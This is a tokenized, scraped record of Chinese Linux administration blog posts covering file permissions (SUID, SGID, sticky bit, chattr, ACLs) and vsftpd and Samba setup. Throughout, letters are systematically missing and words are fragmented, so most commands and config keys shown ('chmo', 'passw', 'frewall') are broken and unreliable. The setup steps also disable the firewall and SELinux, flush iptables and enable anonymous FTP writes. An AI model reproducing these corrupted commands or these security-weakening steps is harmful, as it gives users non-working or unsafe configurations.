","分为","4部","分","【","文件","或","文件夹","】","【","owner","权限","】","【","group","权限","】","【","others","权限","】","【","文件","是","-","，","文件夹","是","】","【","rwx","相加","】","【","rwx","相加","】","【","rwx","相加","】","Lnux","档案","的","基本","权限","就","有","九个","，","分","别","是","ownergroupothers","三种","身份","各","有","自","己","的","reawrteexecute","权限","特殊","权限","可读","可","写","可执行","不","能够","满足","我们","对","安全","和","灵活性","的","需求","，","因此","便","有了","SUID","、","SGID","与","SBIT","的","特殊","权限","位","SUIDSUID","是","一种","对","二进制","程序","进行","设置","的","特殊","权限","，","可以","让","二进制","程序","的","执行者","临时","拥有","属主","的","权限","（","仅","对","拥有","执行","权限","的","二进制","程序","有效","）","。","例如","，","所有","用户","都","可以","执行","passw","命令","来","修改","自己","的","用户密码","，","而","用户密码","保","存在","etcshaow","文件","中","。","仔细","查看","这个","文件","就","会","发现","它","的","默认","权限","是","000","，","也就是说","除了","root","管理员","以外","，","所有","用户","都","没有","查看","或","编辑","该","文件","的","权限","。","但是","，","在","使用","passw","命令","时","如果","加上","SUID","特殊","权限","位","，","就","可","让","普通","用户","临时","获得","程序","所有者","的","身份","，","把","变更","的","密码","信息","写入","到","shaow","文件","中","。","这很","像","我们","在","古装","剧中","见到","的","手持","尚方宝剑","的","钦差大臣","，","他","手持","的","尚方宝剑","代表","的","是","皇上","的","权威","，","因此","可以","惩戒","贪官","，","但","这","并不","意味着","他","永久","成为","了","皇上","。","因此","这","只","是","一种","有条件的","、","临时","的","特殊","权限","授权","方法","。","查看","passw","命令","属性","时","发现","所有者","的","权限","由","rwx","变成","了","rws","，","其","中","x","改变成","s","就","意味着","该","文件","被","赋予","了","SUID","权限","。","另外","有","读者","会","好奇","，","那么","如果","原本","的","权限","是","rw","-","呢","？","如果","原先","权限","位","上","没有","x","执行","权限","，","那么","被","赋予","特殊","权限","后","将","变成","大写","的","S","。","[","root@ngnx","~","]","#","ll","usrbnpassw","-","rwsr","-","xr","-","x",".","1","root","root","27856","Aug","8","21",":","39","usrbnpassw","chmo","4700","test",".","txt","#","添加","su","权限","-","rws","-","-","-","-","-","-","1","root","root","0","Dec","20","01",":","48","test",".","txtchmo","700","test",".","txt","#","取消","su","权限","-","rwx","-","-","-","-","-","-","1","root","root","0","Dec","20","01",":","48","test",".","txt","对于","当前","位","没有","x","执行","权限","，","那么","则","显示","大写","的","Schmo","4600","test",".","txt","-","rwS","-","-","-","-","-","-","1","root","root","0","Dec","20","01",":","48","test",".","txt","SGIDSGID","主要","实现","如下","两种","功能","：","1","、","让","执行者","临时","拥有","属组","的","权限","（","对","拥有","执行","权限","的","二进制","程序","进行","设置","）","；","2","、","在","某个","目录","中","创建","的","文件","自动","继承","该","目录","的","用户组","（","只","可以","对","目录","进行","设置","）","。","[","root@DZQ","e","]","#","ll","mem","crw","-","r","-","-","-","-","-","1","root","kmem","1",",","1","Aug","6","08",":","50","mem","1","、","在","某个","目录","中","创建","的","文件","自动","继承","该","目录","的","用户组","2","、","由于","ps","命令","被","增加","了","SGID","特殊","权限","位","，","所以","当","用户","执行","该","命令","时","，","也","就","临时","获取","到了","system","用户组","的","权限","，","从而","可以","顺利地","读取","设备","文件","了","SBITStcky","Bt",",","SBIT","特殊","权限","位","可","确保","用户","只能","删除","自己","的","文件","，","而","不能","删除","其他用户","的","文件","。","换句话说","，","当","对","某个","目录","设置","了","SBIT","粘滞","位","权限","后","，","那么","该","目录","中的","文件","就","只能","被","其","所有者","执行","删除","操作","了","与","前面","所","讲","的","SUID","和","SGID","权限","显示","方法","不同","，","当","目录","被","设置","SBIT","特殊","权限","位","后","，","文件","的","其他人","权限","部分","的","x","执行","权限","就","会","被","替换","成","t","或者","T","，","原本","有","x","执行","权限","则","会","写成","t","，","原本","没有","x","执行","权限","则","会","被","写成","T","。","[","lnuxprobe@lnuxprobe","tmp","]","$","ls","-","al","tmprwxrwxrwt",".","17","root","root","4096","Feb","11","13",":","03","tmp","要是","也","想","对","其他","目录","来","设置","SBIT","特殊","权限","位","，","用","chmo","命令","就","可以","了","。","对应","的","参数","o","+","t","代表","设置","SBIT","粘滞","位","权限","[","root@lnuxprobe","~","]","#","chmo","-","R","o","+","t","lnux","[","root@lnuxprobe","~","]","#","ls","-","l","lnuxrwxr","-","xr","-","t",".","2","root","root","6","Feb","11","19",":","34","lnux","隐藏","权限","chattrchattr","命令","用于","设置","文件","的","隐藏","权限","，","格式","为","“","chattr","[","参数","]","文件","”","。","如果","想要","把","某个","隐藏","功能","添加","到","文件","上","，","则","需要","在","命令","后面","追加","“","+","参数","”","，","如果","想要","把","某个","隐藏","功能","移出","文件","，","则","需要","追加","“","-","参数","”","。","参数","作用","无法","对","文件","进行","修改","；","若","对","目录","设置","了","该","参数","，","则","仅","能","修改","其","中的","而","不能","新建","或","删除","文件","a","仅","允许","补充","（","追加","）","内容","，","无法","覆盖","删除","内容","（","Appen","Only","）","S","文件","内容","在","变更","后","立即","同步","到","硬盘","（","sync","）","s","彻底","从","硬盘","中","删除","，","不可","恢复","（","用","0","填充","原文","件","所在","硬盘","区域","）","A","不再","修改","这个","文件","或","目录","的","最后","访问","时间","（","atme","）","b","不再","修改","文件","或","目录","的","存取","时间","D","检查","压缩","文件","中的","错误","使用","ump","命令","备份","时","忽略","本文","件","目录","c","默认","将","文件","或","目录","进行","压缩","u","当","删除","该","文件","后","依然","保留","其","在","硬盘","中的","数据","，","方便","日后","恢复","t","让","文件系统","支持","尾部","合并","（","tal","-","mergng","）","X","可以","直接","访问","压缩文件","中的","内容","lsattr","用","chattr","执行","改变","文件","或","目录","的","属性","，","可执行","lsattr","指令","查询","其","属性","。","参数","作用","-","a","显示","所有","文件","和","目录","，","包括","以","”",".","”","为名","称","开头","字符","的","额外","内","建","，","现行","目录","”",".","”","与","上层","目录","”",".",".","”","-","显示","，","目录","名称","，","而","非","其","内容","。","-","R","递归","处理","，","将","指定","目录","下","的","所有","文件","及","子目录","一并处理","for","example","使用","隐藏","权限","，","防止","某个","文件","被","串","改","。","[","root@ngnx","myhouse","]","#","chattr","+","hello",".","m","[","root@ngnx","myhouse","]","#","lsattr","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",".","hello",".","m","文件","操作","命令","chmochmo","可以","藉以","控制","文件","如何","被","他人","所","调用","。","for","example",":","chmo","700","test",".","m","chmo","wxr","-","rx","-","rx","test",".","m","参数","作用","-","c","显示","更改","的","部分","的","信息","-","f","忽略","错误信息","-","h","修复","符号","链接","-","显示","详细的","处理","信息","-","R","处理","指定","目录","以","及其","子目","录","下","的","所有","文件","chownchown","将","指定","文件","的","拥有","者","改为","指定","的","用户","或","组","参数","作用","user","新的","文件","拥有","者","的","使用者","ID","group","新的","文件","拥有","者","的","使用者","组","(","group",")","-","c","显示","更改","的","部分","的","信息","-","f","忽略","错误信息","-","h","修复","符号","链接","-","显示","详细的","处理","信息","-","R","处理","指定","目录","以","及其","子目","录","下","的","所有","文件","For","example",":","更改","一个","目录","文件","以","及其","下子","文件","或者","子目录","的","属主","和","属组","。","mkr","myhousec","myhousetouch","hello",".","m","#","ll","#","-","rw","-","r","-","-","r","-","-","1","root","root","0","Dec","20","08",":","36","hello",".","mc",".",".","#","ll","#","rwxr","-","xr","-","x","2","root","root","22","Dec","20","08",":","36","myhousechown","-","Rc","zq",":","ngnx","myhouse","#","change","ownershp","of","‘","myhousehello",".","m","’","from","root",":","root","to","zq",":","ngnx","#","change","ownershp","of","‘","myhouse","’","from","root",":","root","to","zq",":","ngnxll","#","total","0","#","rwxr","-","xr","-","x","2","zq","ngnx","22","Dec","20","08",":","36","myhousec","myhousell","#","total","0","#","-","rw","-","r","-","-","r","-","-","1","zq","ngnx","0","Dec","20","08",":","38","hello",".","m","-","-","-","-","由此可见","，","myhouse","所属","的","用户","和","组","都","已经","被","更改","，","且","其","子目","录","里","的","hello",".","m","也","被","更改","了","。","chgrp","变更","文件","或","目录","的","所属","群组","。","chgrp","-","bn","myhouse","#","将","myhouse","属组","更改","为","bn","与","chown","的","区别",",","chown","是","将","文件","或者","目录","的","属主","更改","，","而","chgrp","是","更改","属组","chown","root","myhouse","当","chown","以","chown","root",":","ngnx","worl","2",".","m","的","形式","更改","时","，","即","更改","了","属主","又","更改","了","属组","[","root@noe","~","]","#","ll","-","rwxrwxrwx","1","root","root","9","Jan","17","12",":","26","emo","#","改变","属主","[","root@noe","~","]","#","chown","NIKI","emo","[","root@noe","~","]","#","ll","-","rwxrwxrwx","1","NIKI","root","9","Jan","17","12",":","26","emo","#","改变","属组","[","root@noe","~","]","#","chgrp","NIKI","emo","[","root@noe","~","]","#","ll","-","rwxrwxrwx","1","NIKI","NIKI","9","Jan","17","12",":","26","emo","文件","访问","控制","列表","对","指定","的","用户","进行","单独","的","权限","控制","，","就","需要","用到","文件","访问","控制","列表","（","ACL","，","Access","Control","Lst","）","setfaclSet","Fle","Acess","Control","Lst","chmo","命令","可以","把","文件","权限","分为","u",",","g",",","o","三个","组","，","而","setfacl","可以","对","每一个","文件","或","目录","设置","更","精确的","文件","权限","。","换句话说","，","setfacl","可以","更","精确的","控制","权限","的","分配","。","比如","：","让","某一个","用户","对","某一个","文件","具有","某种","权限","。","参数","作用","-","m","更改","当前","文件","的","ACL","-","M",",","–","mofy","-","fle","=","fle","从","文件","中","读取","访问","列表","条目","ACL","进行","修改","-","x","根据","访问","控制","列表","移","除","条目","-","b","删除","所有","扩展","访问","控制","列表","条目","-","k","移","除","默认","访问","控制","列表","-","n","–","no","-","mask","不","重新","计算","有效","权限","掩码","-","–","efault","应","用到","默认","访问","控制","列表","的","操作","-","R","递归","操作","子目","录","-","L","依照","系统","逻辑","，","跟随","符号","链接","-","P","依照","自然","逻辑","，","不","跟随","符号","链接","[","root@localhost","~","]","#","setfacl","-","Rm","u",":","root",":","rwx","rootem","getfacl","显示","文件","上","的","ACL","信息","常见","用法","[","root@ngnx","~","]","#","getfacl","hello","2",".","m","#","fle",":","hello","2",".","m","#","owner",":","root","#","group",":","rootuser",":",":","rw","-","group",":",":","r","-","-","other",":",":","r","-","-","[","root@ngnx","~","]","#","setfacl","-","m","u",":","zq",":","rwx","hello","2",".","m","[","root@ngnx","~","]","#","getfacl","hello","2",".","m","#","fle",":","hello","2",".","m","#","owner",":","root","#","group",":","rootuser",":",":","rw","-","user",":","zq",":","rwxgroup",":",":","r","-","-","mask",":",":","rwxother",":",":","r","-","-"],"url":"http://ymlog.cn/2020/01/17/Linux%E6%9D%83%E9%99%90/","title":"Linux权限","content":"\n\n\n常用命令类型\n举例\n\n\n\n用户\nwho, whoami, su, useradd, userdel, passwd, usermod, /etc/passwd\n\n\n组\ngroupadd, groupdel, groupmod, ...","author":"ZEN","categorie":{"url":"http://ymlog.cn/categories/Linux/","name":"Linux"},"date":"2020-01-17 12:42:03"},{"word":["1","、","FTP","服务","FTP","（","Fle","Transfer","Protocol","）","文件","传输","协议","，","主要功能","是","在","服务器","与","客户端","之间","进行","文件","的","传输","。","FTP","协议","使用","明码","传输","，","为了","使用","更","安全的","FTP","协议","，","可以","采用","sftp","（","Very","Secure","Ftp","Daemon","）","。","协议","摘要","两种","工作","模式","主动","模式","：","FTP","服务器","主动","向","客户端","发起","请求","被动","模式","：","FTP","服务器","等待","客户端","发起","连接","请求","（","FTP","默认","工作","模式","）","三种","用户","等级","匿名","用户","。","是","一种","最","不安全","的","认证","模式","，","任何人","都","可以","无需","密码","验证","而","直接","登录","到","FTP","服务器","。","匿名","用户","默认","访问","目录","是","：","arftp","本地","用户","：","使用","Lnux","本地","的","账户","密码","进行","认证","，","默认","访问","目录","是","homeperson","虚拟","用户","：","是","这","三种","模式","中","最","安全的","一种","认证","模式","，","它","需要","为","FTP","服务","单独","建立","用户","数据库文件","，","虚拟","出","用来","进行","口令","验证","的","账户","信息","，","而","这些","账户","信息","在","服务器","系统","中","实际上","是","不存在","的","，","仅","供","FTP","服务","程序","进行","认证","使用","。","这样","，","即使","黑客","破解","了","账户","信息","也","无法","登录","服务器","，","从而","有效","降低","了","破坏","范围","和","影响","。","限制","用户","活动","目录","（","change","root","，","简称","chroot","）","：","将","使用者","的","工作范围","限定","在","用户","的","家","目录","。","两个","指定","端口","​","21","端口","用来","建立","连接","，","20","端口","用于","传输","数据","。","配置","文件","​","FTP","使用","系统","的","syslog","来","进行","数据","记录","，","记录","了","包括","用户","曾经","下达","过","的","命令","与","用户","传输","数据","（","传输","时间","，","文件大小","等","）","记录","，","记录","文件","在","arlog","下","。","主","配置","文件","​","VSftp","服务","程序","的","主","配置","文件","在","etcsftpsftp",".","conf","下","[","root@localhost","~","]","#","grep","-","E","'","^","#","'","etcsftpsftp",".","confanonymous","_","enable","=","YESlocal","_","enable","=","YESwrte","_","enable","=","YESlocal","_","umask","=","022","rmessage","_","enable","=","YESxferlog","_","enable","=","YESconnect","_","from","_","port","_","20","=","YESxferlog","_","st","_","format","=","YESlsten","=","NOlsten","_","p","6","=","YESpam","_","serce","_","name","=","sftpuserlst","_","enable","=","YEStcp","_","wrappers","=","YES","参数","作用","lsten","=","[","YESNO","]","是否","以","独立","运行","的","方式","监听","服务","lsten","_","aress","=","IP","地址","设置","要","监听","的","IP","地址","lsten","_","port","=","21","设置","FTP","服务","的","监听","端口","ownloa","_","enable","＝","[","YESNO","]","是否","允许","下载","文件","userlst","_","enable","=","[","YESNO","]","userlst","_","eny","=","[","YESNO","]","设置","用户","列表","为","“","允许","”","还","是","“","禁止","”","操作","max","_","clents","=","0","最大","客户端","连接","数","，","0","为","不","限制","max","_","per","_","p","=","0","同一","IP","地址","的","最大","连接","数","，","0","为","不","限制","anonymous","_","enable","=","[","YESNO","]","是否","允许","匿名","用户","访问","anon","_","uploa","_","enable","=","[","YESNO","]","是否","允许","匿名","用户","上传","文件","anon","_","umask","=","022","匿名","用户","上传","文件","的","umask","值","anon","_","root","=","arftp","匿名","用户","的","FTP","根目录","anon","_","mkr","_","wrte","_","enable","=","[","YESNO","]","是否","允许","匿名","用户","创建","目录","anon","_","other","_","wrte","_","enable","=","[","YESNO","]","是否","开放","匿名","用户","的","其他","写入","权限","（","包括","重","命名","、","删除","等","操作","权限","）","anon","_","max","_","rate","=","0","匿名","用户","的","最大","传输","速率","（","字节","秒","）","，","0","为","不","限制","local","_","enable","=","[","YESNO","]","是否","允许","本地","用户","登录","FTP","local","_","umask","=","022","本地","用户","上传","文件","的","umask","值","local","_","root","=","arftp","本地","用户","的","FTP","根目录","chroot","_","local","_","user","=","[","YESNO","]","是否","将","用户权限","禁锢","在","FTP","目录","，","以","确保","安","全","local","_","max","_","rate","=","0","本地","用户","最大","传输","速率","（","字节","秒","）","，","0","为","不","限制","PAM","配置","以下","配置","是","PAM","在","FTP","文件","中的","配置","，","写入","etcsftpsftp",".","conf","参数","作用","anonymous","_","enable","=","NO","禁止","匿名","开放","模式","local","_","enable","=","YES","允许","本地","用户","模式","guest","_","enable","=","YES","开启","虚拟","用户","模式","guest","_","username","=","rtual","指定","虚拟","用户","账户","pam","_","serce","_","name","=","sftp",".","u","指定","PAM","文件","allow","_","wrteable","_","chroot","=","YES","允许","对","禁锢","的","FTP","根目录","执行","写入","操作","，","而且","不","拒绝","用户","的","登录","请求","FTP","用户","禁止","登录","表","[","root@centos","nk","]","#","cat","etcsftpuser","_","lstrootbnaemonamlpsyncshutownhaltmalnewsuucpoperatorgamesnoboy","[","root@centos","nk","]","#","cat","etcsftpftpusers","#","Users","that","are","not","allowe","to","logn","a","ftprootbnaemonamlpsyncshutownhaltmalnewsuucpoperatorgamesnoboy","FTP","-","SElnux","[","root@lnuxprobe","~","]","#","getsebool","-","a","grep","ftpftp","_","home","_","r","-","-","offftp","_","anon","_","wrte","-","-","offftp","_","connect","_","all","_","unresere","-","-","offftp","_","connect","_","b","-","-","offftp","_","full","_","access","-","-","offftp","_","use","_","cfs","-","-","offftp","_","use","_","fusefs","-","-","offftp","_","use","_","nfs","-","-","offftp","_","use","_","passe","_","moe","-","-","offhttp","_","can","_","connect","_","ftp","-","-","offhttp","_","enable","_","ftp","_","serer","-","-","offsftp","_","anon","_","wrte","-","-","offsftp","_","enable","_","homers","-","-","offsftp","_","full","_","access","-","-","offsftp","_","wrte","_","ssh","_","home","-","-","offtftp","_","anon","_","wrte","-","-","offtftp","_","home","_","r","-","-","off","[","root@lnuxprobe","~","]","#","setsebool","-","P","ftp","_","full","_","access","=","on","安装","FTP","服务","yum","-","y","nstall","sftp","#","清","空","Iptables","，","因为","Iptables","防火墙","管理工具","默认","禁止","FTP","传输","协议","的","端口","号","ptables","-","F","#","下一步","是","使用","serce","ptables","sae","保存","防火墙","规则","，","但","这里","没","有","，","我们","需要","安装","ptables","-","sercessystemctl","stop","frewallyum","nstall","ptables","-","serces","-","ysystemctl","enable","ptablessystemctl","start","ptablesserce","ptables","sae","#","安装","客户端","工具","yum","-","y","nstall","ftp","1",".","匿名","登录","模式","参数","作用","anonymous","_","enable","=","YES","允许","匿名","访问","模式","anon","_","umask","=","022","匿名","用户","上传","文件","的","umask","值","anon","_","uploa","_","enable","=","YES","允许","匿名","用户","上传","文件","anon","_","mkr","_","wrte","_","enable","=","YES","允许","匿名","用户","创建","目录","anon","_","other","_","wrte","_","enable","=","YES","允许","匿名","用户","修改","目录","名称","或","删除","目录","什么是","umask","值","？","umask","值","用于","设置","用户","在","创建","文件","时","的","默认","权限","，","当","我们","在","系统","中","创建","目录","或","文件","时","，","目录","或","文件","所","具","有的","默认","权限","就是","由","umask","值","决定","的","。","#","首先","清","空文","件","cat","enull","etcsftpsftp",".","conf","#","然后","写入","cat","etcsftpsftp",".","conf","EOF","#","匿名","用户","上传","文件","的","umask","值","anon","_","umask","=","022","#","允许","匿名","用户","上传","文件","anon","_","uploa","_","enable","=","YES","#","允许","匿名","用户","创建","目录","anon","_","mkr","_","wrte","_","enable","=","YES","#","允许","匿名","用户","修改","目录","名称","或者","删除","目录","anon","_","other","_","wrte","_","enable","=","YES","#","允许","匿名","访问","anonymous","_","enable","=","YESEOF","#","防止","干扰","systemctl","stop","frewallsetenforce","0","#","重","启","VSftp","服务","systemctl","restart","sftp","#","开机","自","启","systemctl","enable","sftp","2",".","本地","用户","登录","参数","作用","anonymous","_","enable","=","NO","禁止","匿名","访问","模式","local","_","enable","=","YES","允许","本地","用户","模式","wrte","_","enable","=","YES","设置","可","写","权限","local","_","umask","=","022","本地","用户","模式","创建","文件","的","umask","值","userlst","_","enable","=","YES","启用","“","禁止","用户","名单","”","，","名","单","文件","为","ftpusers","和","user","_","lst","userlst","_","eny","=","YES","开启","用户","作用","名单","文件","功能","etcsftpsftp",".","confcat","etcsftpsftp",".","conf","EOFanonymous","_","enable","=","NOlocal","_","enable","=","YESwrte","_","enable","=","YESlocal","_","umask","=","022","pam","_","serce","_","name","=","sftp","#","不","加","这","一句","登录","就","会报","530","的","错","EOF","#","防止","干扰","systemctl","stop","frewallsetenforce","0","#","本地","用户","需要","使用","本地","Lnux","的","账号","登录","，","这里","创建","一个","账户","并","添加","用户名","和","密码","usera","nkecho","\"","monan","\"","passw","-","-","stn","nkecho","\"","Ths","s","$","PWD","\"","homenktool",".","txt","#","重","启","VSftp","服务","systemctl","restart","sftp","#","开机","自","启","systemctl","enable","sftp","如果","是","530","登录","异常","：","https",":","blog",".","csn",".","netwlchnartcleetals","50855447","3",".","虚拟","用户","登录","虚拟","用户","登录","配置文件","关系","图","：","pam","_","serce","_","name","：","用户","认证","文件","guest","_","username","：","指定","虚拟","用户","账户","user","_","confg","_","r","：","用户","配置","目录","虚拟","用户","认证","即使","知道了","登录","FTP","服务器","的","账号","密码","，","也不","会","对","Lnux","主机","造成","破坏","，","因为","虚拟","认证","的","账号","密码","在","Lnux","服务器","内","并不","存在","。","正","如同","这里","的","zq","-","-","-","123","以及","gz","-","-","-","456","，","在","Lnux","系统","中","并没有","相关","的","用户","。","而","这些","虚拟","的","用户","会","统一","映射","到","Vrtual","这个","用户","下","。","关于","FTP","服务器","使用","虚拟","用户","登录","的","时候","为什么","还要","再","建立","一个","本地","账户","的","解释","：","由于","Lnux","系统","中的","每一个","文件","都","有","所有者","、","所属","组","属性","，","例如","使用","虚拟","账户","“","张三","”","新建","了","一个","文件","，","但是","系统","中","找不到","账户","“","张三","”","，","就","会","导致","这个","文件","的","权限","出现","错误","。","为此","，","需要","再创","建","一个","可以","映射","到","虚拟","用户","的","系统","本地","用户","。","简单来说","，","就是","让","虚拟","用户","默认","登录","到","与之","有","映射","关系","的","这个","系统","本地","用户","的","家","目录","中","，","虚拟","用户","创建","的","文件","的","属性","也","都","归属","于","这个","系统","本地","用户","，","从而","避免","Lnux","系统","无法","处理","虚拟","用户","所","创建","文件","的","属性","权限","。","#","创建","用户名","和","密码","并","Hash","，","奇数","行","是","用户名","，","偶数","行","是","密码","rm","-","rf","etcsftpuser","*","cat","etcsftpuser",".","lst","EOFzq","123","gz","456","EOF","#","将","用户信息","文件","转换","为","数据库","并","使用","Hash","加密","b","_","loa","-","T","-","t","hash","-","f","user",".","lst","user",".","bchmo","600","user",".","brm","-","f","user",".","lst","#","添加","用户","，","指定","解释","器","nologn",",","使用","户","无法","登录","系统","usera","-","s","sbnnologn","rtualchmo","-","Rf","755","homertualcat","etcpam",".","sftp",".","u","EOFauth","requre","pam","_","userb",".","so","b","=","etcsftpuseraccount","requre","pam","_","userb",".","so","b","=","etcsftpuserEOFmkr","etcsftpusers","_","rtouch","etcsftpusers","_","rzqcat","etcsftpusers","_","rgz","EOFanon","_","uploa","_","enable","=","YESanon","_","mkr","_","wrte","_","enable","=","YESanon","_","other","_","wrte","_","enable","=","YESEOFcat","etcsftpsftp",".","conf","EOFanonymous","_","enable","=","NOlocal","_","enable","=","YESguest","_","enable","=","YESguest","_","username","=","rtualallow","_","wrteable","_","chroot","=","YESwrte","_","enable","=","YESlocal","_","umask","=","022","rmessage","_","enable","=","YESxferlog","_","enable","=","YESconnect","_","from","_","port","_","20","=","YESxferlog","_","st","_","format","=","YESlsten","=","NOlsten","_","p","6","=","YES","#","修改","ftp","默认","配置","中的","pam","认证","文件",",","表示","服务器","是","根据","etcpam",".","sftp",".","u","进行","认证","的","pam","_","serce","_","name","=","sftp",".","uuserlst","_","enable","=","YEStcp","_","wrappers","=","YES","#","该","目录","下定义","了","用户","的","配置","，","如","权限","之类","user","_","confg","_","r","=","etcsftpusers","_","rEOFsystemctl","restart","sftp","b","_","loa","介绍","：","将","用户信息","文件","转换","为","数据库","并","使用","Hash","加密","参数","作用","-","T","选项","-","T","允许","应用程序","能够","将","文本文","件","转译","载入","进","数据库","。","由于","我们","之后","是","将","虚拟","用户","的","信息","以","文件","方式","存储","在","文件","里","的","，","为","了","让","Vsftp","这个","应用程序","能够","通过","文本","来","载入","用户","数据","，","必","须要","使用","这个","选项","。","如果","指定","了","选项","-","T","，","那么","一定要","追","跟","子","选项","-","t","-","t","子","选项","-","t","，","追加","在在","-","T","选项","后","，","用来","指定","转译","载入","的","数据库","类型","。","扩展","介绍","下","，","-","t","可以","指定","的","数据类型","有","Btree","、","Hash","、","Queue","和","Recon","数据库","。","-","f","参数","后面","接","包含","用户名","和","密码","的","文本文件","，","文件","的","内容","是","：","奇数","行","用户名","、","偶数","行","密码","默认","登录","目录","是","homertual","PAM","认证","原文","链接","：","https",":","blog",".","csn",".","netzhangym","199312","artcleetals","78021998","PAM","简介","Sun","公司","于","1995","年","开发","的","一种","与","认证","相关","的","通用","框架","机制","PAM","是","关注","如何","为","服务","验证","用户","的","API","，","通过","提供","一些","动态","链接","库","和","一套","统一","的","API","，","将","系统","提供","的","服务","和","该","服务","的","认证","方式","分","，","使得","系统管理员","可以","灵活地","根据","需要","给","不同的","服务","配置","不同的","认证","方式","而","无需","更改","服务","程序","，","同时","，","PAM","是","一种","认证","框架","，","自身","不做","认证","PAM","(","Pluggable","Authentcaton","Moules",")","即可","插","拔","式","认证","模块","，","它是","一种","高效","而且","灵活","便利的","用户","级","别的","认证","方式","，","它","也是","当前","Lnux","服务器","普遍","使用","的","认证","方式","。","当然","，","在","不同","版本","的","Lnux","统","中","部署","PAM","认证","是","有所不同","的","。","它","提供","了","对","所有","服务","进行","认证","的","中央","机制","，","适用于","logn","，","远程","登录","（","telnet",",","rlogn",",","fsh",",","ftp",",","点对点","协议","（","PPP","）","）","，","su","等","应用程序","中","。","系统管理员","通过","PAM","配置文件","来","制定","不同","应用程序","的","不同","认证","策略","；","应用程序","开发者","通过","在","服务","程序","中","使用","PAM","API","(","pam","_","xxxx","(",")",")","来","实现","对","认证","方法","的","调用","；","而","PAM","服务","模块","的","开发者","则","利用","PAM","SPI","来","编写","模块","（","主要","是","引出","一些","函数","pam","_","sm","_","xxxx","(",")","供","PAM","接口","库","调用","）","，","将","不同的","认证","机制","加入","到","系统","中","；","PAM","接口","库","（","lbpam","）","则","读取","配置","文件","，","将","应用程序","和","相应","的","PAM","服务","模块","联系","起来","。","PAM","架构","如","下图","所","示","：","认证","顺序","：","Serce","（","服务","）","—","-","PAM","配置","文件","—","–","pam","_","*",".","so","首先","查看","服务","，","查看","服务","上","是否","定义","的","有","pam","验证","的","信息","，","根据","这些","验证","信息","，","去","读取","pam","配置","文件","，","之后","，","pam","配置","文件","里面","定义","各种","规则","（","我们","管理员","需要","定义","的","）","，","生效","，","调用","pam","_","*",".","so","模块","。","2","、","Samba","服务","简介","SMB","简介","：","​","Samba","（","Serer","Message","Block","，","服务","消息","块","）","是","在","Lnux","和","Unx","系统","上","实现","SMB","协议","的","一个","免费","软件","，","提供","CIFS","(","Common","Internet","Fle","System",")","协议","，","由","服务器","及","客户端","程序","构成","，","SMB","(","Serer","Messages","Block",",","信息","服务","块",")","是","一种","在","局域网","上","共享","文件","和","打印机","的","一种","通信协议","，","它","为","局域网","内","的","不同","计算机","之间","提供","文件","及","打印机","等","资源","的","共享","服务","。","CIFS","简介","：","CIFS","(","Common","Internet","Fle","System",")","文件系统","也","称","通用","Internet","文件系统",",","它","使","程序","可以","访问","远程","Internet","计算机","上","的","文件","并","要求","此","计算机","的","服务","。","CIFS","使用","客户","服务器","模式","。","客户","程序","请求","远在","服务器","上","的","服务","程序","为","它","提供","服务","，","服务器","获得","请求","并","返回","响应","。","CIFS","是","公开","的","开放","的","SMB","协议","版本","。","SMB","协议","现在","是","在","局域","网上","用于","服务器","文件","访问","和","打印","的","协议","。","像","SMB","协议","一样","，","CIFS","在","高层","运行","。","可以","看做","是","应用程序","协议","如","文件传输","协议","和","超文本","传输","协议","的","一个","实现","。","CIFS","功能","：","访问","服务器","本地文件","并","读写","这些","文件","与其","它","用户","一起","共享","一些","文件","块","在","断线","时","自动","恢复","与","网络","的","连接","使用","统一","码","文件名","CIFS","是","SMB","协议","的","衍生","品","，","即","CIFS","是","SMB","协议","的","一种","特殊","实现","，","由","美国","微软公司","开发","。","配置文件","Samba","功能","使","Lnux","主机","称为","wnow","网络","中的","一","份子","，","与","wnow","系统","相互","分享","资源","让","lnux","主机","能","使用","wnow","共享","的","文件","和","打印机","使","Lnux","主机","称为","Wns","名称","服务器","，","提供","NetBIOS","名字","解析","服务器","提供","用户","身份","验证","功能","支","持","SSL","安全套","接","层","协议","Samba","提供","服务","文件","和","打印机","共享","用户","验证","和","授权","名字","解析","浏览","（","服务","通告","）","Samba","守护","进程","Smb","：","实现","共享","和","验证","授权","功能","Nmb","：","实现","名字","解析","和","浏览","服务","Samba","的","RPM","包","：","samba","-","common",":","服务端","和","客户端","所","需要","的","文件","samba","：","服务端","软件","samba","&","#","x","3","D",";","wnbn","：","可选","的","wnbn","服务","samba","-","clent","：","客户端","软件","samba","-","swat","：","Web","配置","工具","Samba","服务","的","配置","文件","在","etcsambasmb",".","conf","下","，","其","主要","的","参数","和","作用","如下","：","[","global","]","#","全局","参数","。","workgroup","=","MYGROUP","#","工作组","名称","serer","strng","=","Samba","Serer","Verson","%","#","服务器","介绍","信息","，","参数","%","为","显示","SMB","版本号","log","fle","=","arlogsambalog",".","%","m","#","定义","日志","文件","的","存放","位置","与","名称","，","参数","%","m","为","来访","的","主机名","max","log","sze","=","50","#","定义","日志","文件","的","最大","容量","为","50","KB","securty","=","user","#","安全","验证","的","方式","，","总共","有","4种","#","1",".","share","：","来访","主机","无需","验证","口令","；","比较","方便","，","但","安全性","很差","#","2",".","user","：","需","验证","来访","主机","提供","的","口令","后","才","可以","访问","；","提升","了","安全性","#","3",".","serer","：","使用","独立的","远程","主机","验证","来访","主机","提供","的","口令","（","集中","管理","账户","）","#","4",".","oman","：","使用","域","控制器","进行","身份验证","passb","backen","=","tbsam","#","定义","用户","后台","的","类型","，","共有","3种","#","1",".","smbpassw","：","使用","smbpassw","命令","为","系统","用户","设置","Samba","服务","程序","的","密码","#","2",".","tbsam","：","创建","数据库文件","并","使用","pbet","命令","建立","Samba","服务","程序","的","用户","#","3",".","lapsam","：","基于","LDAP","服务","进行","账户","验证","loa","prnters","=","yes","loa","prnters","=","yes","#","设置","在","Samba","服务","启动","时","是否","共享","打印机","设备","cups","optons","=","raw","#","打印机","的","选项","[","homes","]","#","共享","参数","comment","=","Home","Drectores","#","描述","信息","browseable","=","no","#","指定","共享","信息","是否","在","“","网上邻居","”","中","可见","wrtable","=","yes","#","定义","是否","可以","执行","写入","操作","，","与","“","rea","only","”","相反","[","prnters","]","#","打印机","共享","参数","comment","=","All","Prnters","path","=","arspoolsamba","#","共享","文件","的","实际","路径","(","重要",")","。","browseable","=","no","guest","ok","=","no","#","是否","所有人","可见","，","等同于","\"","publc","\"","参数","。","wrtable","=","no","prntable","=","yes","[","atabase","]","#","共享","名称","为","atabasecomment","=","Do","not","arbtrarly","mofy","the","atabase","fle","#","警告","用户","不要","随意","修改","数据库","path","=","homeatabase","#","共享","目录","为","homeatabasepublc","=","no","#","关闭"